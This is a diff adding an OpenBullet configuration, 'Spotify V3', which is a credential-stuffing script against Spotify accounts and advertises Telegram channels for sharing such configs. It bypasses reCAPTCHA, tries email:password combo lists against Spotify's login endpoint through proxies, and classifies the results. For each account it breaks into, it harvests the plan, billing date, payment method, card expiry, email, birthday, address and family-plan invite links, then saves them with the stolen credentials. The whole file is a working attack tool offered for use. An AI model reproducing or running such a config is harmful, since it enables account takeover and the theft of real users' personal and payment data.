@@ -1,0 +1,172 @@
+[SETTINGS]
+{
+  "Name": "Spotify V3",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-07T00:33:35.5061647+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Full Capture | ProxyLess | ReCaptcha Bypassed | CPM Rate : 200-1500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#G REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "Pragma: no-cache" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+#Token PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "Token" 
+
+#P REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39" 
+  CONTENT "v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.google.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+#rresp PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"" -> VAR "rresp" 
+
+#Get_Cookies REQUEST GET "https://accounts.spotify.com/en/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#csrf PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "csrf" 
+
+#device_id PARSE "<COOKIES(__Host-device_id)>" LR "" "" -> VAR "device_id" 
+
+#Secure-TPASESSION PARSE "<COOKIES(__Secure-TPASESSION)>" LR "" "" -> VAR "Secure-TPASESSION" 
+
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Length FUNCTION Length "remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username=<US>&password=<PASS>&recaptchaToken=<rresp>&csrf_token=<csrf>" -> VAR "Ln2" 
+
+#Login REQUEST POST "https://accounts.spotify.com/login/password" 
+  CONTENT "remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username=<US>&password=<PS>&recaptchaToken=<rresp>&csrf_token=<csrf>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  SECPROTO TLS11 
+  COOKIE "sp_t=576b5e3d-a565-47d4-94ce-0b6748fdc625; _gcl_au=1.1.1585241231.1587921490; sp_adid=fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49; _scid=5eee3e0e-f16b-4f4c-bf73-188861f9fb0c; _hjid=fb8648d2-549b-44c8-93e9-5bf00116b906; _fbp=fb.1.1587921496365.773542932; __Host-device_id=<device_id>; cookieNotice=true; sp_m=us; spot=%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; sp_last_utm=%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D; _gcl_dc=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gcl_aw=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gac_UA-5784146-31=1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; ki_t=1597938645946%3B1599140931855%3B1599140931855%3B3%3B3; ki_r=; optimizelyEndUserId=oeu1599636139883r0.3283057902318758; optimizelySegments=%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; sp_landingref=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.2046705606.1599636143; _sctr=1|1599634800000; sp_usid=ceb6c24c-d1b4-4895-bcb7-e4e386afd063; sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; _pin_unauth=dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV; __Secure-TPASESSION=<Secure-TPASESSION>; __bon=MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=; remember=<US>; OptanonAlertBoxClosed=2020-09-09T18: 37:10.735Z; OptanonConsent=isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ; csrf_token=<csrf>; _ga_S35RN5WNT2=GS1.1.1599675929.1.1.1599676676.0; _ga=GA1.2.1572440783.1597938634; _gat=1" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "content-length: <Ln2>" 
+  HEADER "origin: https://accounts.spotify.com" 
+  HEADER "referer: https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"errorInvalidCredentials\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"result\":\"ok\",\"" 
+  KEYCHAIN Ban OR 
+    KEY "{\"error\":\"server_error" 
+
+#GET_CAP REQUEST GET "https://www.spotify.com/us/api/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Plan PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Country PARSE "<SOURCE>" LR "Country\",\"value\":\"" "\"}]" CreateEmpty=FALSE -> CAP "Country" 
+
+#KIR FUNCTION ToLowercase "<Country>" -> VAR "KIR" 
+
+#NNN PARSE "<SOURCE>" LR "class=\\u0022recurring-date\\u0022\\u003E" "\\u003C\\/b\\u003E.\"}," -> VAR "NNN" 
+
+#Nex_Billing_Time FUNCTION Replace "\\/" "/" "<NNN>" -> CAP "Nex Billing Time" 
+
+#Payment_Method PARSE "<SOURCE>" LR "{\"paymentMethod\":{\"name\":\"" "\"," CreateEmpty=FALSE -> CAP "Payment Method" 
+
+#CCC PARSE "<SOURCE>" LR "\"expiry\":\"" ",\"" -> VAR "CCC" 
+
+#Card_Expire_At FUNCTION Replace "\\/" "/" "<CCC>" -> CAP "Card Expire At" 
+
+#Email PARSE "<SOURCE>" LR "\"Email\",\"value\":\"" "\"}" CreateEmpty=FALSE -> CAP "Email" 
+
+#UserName PARSE "<SOURCE>" LR "\":\"Username\",\"value\":\"" "\"}," CreateEmpty=FALSE -> CAP "UserName" 
+
+#DDD PARSE "<SOURCE>" LR "\":\"Date of birth\",\"value\":\"" "\"}," -> VAR "DDD" 
+
+#Birthday FUNCTION Replace "\\/" "/" "<DDD>" -> CAP "Birthday" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Plan>" Contains "Spotify Free" 
+
+#Get_Family REQUEST GET "https://www.spotify.com/us/home-hub/api/v1/family/home/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#invite_Token PARSE "<SOURCE>" JSON "inviteToken" CreateEmpty=FALSE -> CAP "invite Token" 
+
+#Max_Capacity PARSE "<SOURCE>" JSON "maxCapacity" CreateEmpty=FALSE -> CAP "Max Cpacity" 
+
+#occurences FUNCTION CountOccurrences "isChildAccount" "<SOURCE>" -> VAR "occurences" 
+
+#inv FUNCTION Constant "<occurences>/6" -> CAP "Invites Left" 
+
+#invite_link FUNCTION Constant "https://www.spotify.com/<KIR>/family/join/invite/<invite Token>/" -> CAP "invite link" 
+
+#is_Child_Account PARSE "<SOURCE>" JSON "isChildAccount" CreateEmpty=FALSE -> CAP "is Child Account" 
+
+#Address PARSE "<SOURCE>" JSON "address" CreateEmpty=FALSE -> CAP "Address" 
+
+#onboarding_State PARSE "<SOURCE>" JSON "onboardingState" CreateEmpty=FALSE -> CAP "Onboarding State" 
+
+#homeId PARSE "<SOURCE>" JSON "homeId" CreateEmpty=FALSE -> CAP "home Id" 
+
+#CC FUNCTION Constant "T.me/OpenBulletConfigs " -> CAP " Join Telegram Channel " 
+
+#Save UTILITY File "Spotify Premium.txt" AppendLines "<<<<<<Account>>>>>>\\nCombo: <USER>:<PASS>\\nUser: <USER>\\nPass: <PASS>\\n<<<<<<INFO>>>>>>\\nPlan: <Plan>\\nCountry: <Country>\\nNex Billing Time: <Nex Billing Time>\\nPayment Method: <Payment Method>\\nCard Expire At: <Card Expire At>\\nEmail: <Email>\\nUserName: <UserName>\\nBirthday: <Birthday>\\ninvite Token: <invite Token>\\nMax Cpacity: <Max Cpacity>\\nInvites Left: <Invites Left>\\ninvite link: <invite link>\\nAddress: <Address>\\nOnboarding State: <Onboarding State>\\nhome Id: <home Id>\\n\\n\\n<<<<<<=Credit=>>>>>>\\nConfiged By: T.me/TheOwn\\nTelegram Channel: T.me/BruteForce\\n===============================================" -> VAR "Save" 
+
